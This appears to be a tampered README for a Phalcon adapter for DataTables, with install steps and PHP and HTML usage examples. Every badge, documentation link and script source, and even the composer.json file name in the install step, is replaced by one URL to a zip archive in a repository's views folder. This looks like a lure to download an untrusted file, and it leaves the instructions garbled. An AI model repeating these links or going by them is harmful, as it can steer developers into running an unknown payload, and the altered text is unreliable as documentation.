
![Build Status](https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip) [![Build Status](https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip)](https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip) [![Coverage Status](https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip)](https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip)

[![Total Downloads](https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip)](https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip)  [![License](https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip)](https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip)
[![Dependency Status](https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip)](https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip)


# About
This is a [Phalcon Framework](https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip) adapter for [DataTables](https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip).
# Support
### Currently supported
* QueryBuilder interface
* ResultSet interface
* Pagination
* Global search (by value)
* Ordering
* Multiple column ordering
* Column-based search

# Installation
### Installation via Composer
* Install a composer
* Create `https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip` file inside your project directory
* Paste into it
```json
{
    "require": {
        "m1ome/phalcon-datatables": "1.*"
    }
}
```
* Run `composer update`

# Example usage
It uses Phalcon [QueryBuilder](https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip) for pagination in DataTables.

In example we have a stantart MVC application, with database enabled. Don't need to provide a normal bootstrap PHP file, for Phalcon documentation, visit official site.

### Controller (using QueryBuilder):
```php
<?php
use \DataTables\DataTable;

class TestController extends \Phalcon\Mvc\Controller {
    public function indexAction() {
        if ($this->request->isAjax()) {
          $builder = $this->modelsManager->createBuilder()
                          ->columns('id, name, email, balance')
                          ->from('Example\Models\User');

          $dataTables = new DataTable();
          $dataTables->fromBuilder($builder)->sendResponse();
        }
    }
}
```

### Controller (using ResultSet):
```php
<?php
use \DataTables\DataTable;

class TestController extends \Phalcon\Mvc\Controller {
    public function indexAction() {
        if ($this->request->isAjax()) {
          $resultset  = $this->modelsManager->createQuery("SELECT * FROM \Example\Models\User")
                             ->execute();

          $dataTables = new DataTable();
          $dataTables->fromResultSet($resultset)->sendResponse();
        }
    }
}
```

### Controller (using Array):
```php
<?php
use \DataTables\DataTable;

class TestController extends \Phalcon\Mvc\Controller {
    public function indexAction() {
        if ($this->request->isAjax()) {
          $array  = $this->modelsManager->createQuery("SELECT * FROM \Example\Models\User")
                             ->execute()->toArray();

          $dataTables = new DataTable();
          $dataTables->fromArray($array)->sendResponse();
        }
    }
}
```

### Model:
```php
<?php
/**
* @property integer id
* @property string name
* @property string email
* @property float balance
*/
class User extends \Phalcon\Mvc\Model {
}
```

### View:
```html
<html>
    <head>
        <title>Simple DataTables Application</title>
        <script type="text/javascript" language="javascript" src="https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip"></script>
        <script type="text/javascript" language="javascript" src="https://raw.githubusercontent.com/dandfgit/phalcon-datatables/master/site/app/views/phalcon-datatables-3.5.zip"></script>
        <script type="text/javascript">
            $(document).ready(function() {
                $('#example').DataTable({
                    serverSide: true,
                    ajax: {
                        url: '/test/index',
                        method: 'POST'
                    },
                    columns: [
                        {data: "id", searchable: false},
                        {data: "name"},
                        {data: "email"},
                        {data: "balance", searchable: false}
                    ]
                });
            });
        </script>
    </head>
    <body>
        <table id="example">
            <thead>
                <th>ID</th>
                <th>Username</th>
                <th>Email</th>
                <th>Balance</th>
            </thead>
            <tbody>
            </tbody>
        </table>
    </body>
</html>
```

# More examples
For more examples please search in `site` directory.
It contains basic *Phalcon* bootstrap page to show all Phalcon-DataTables functionality.
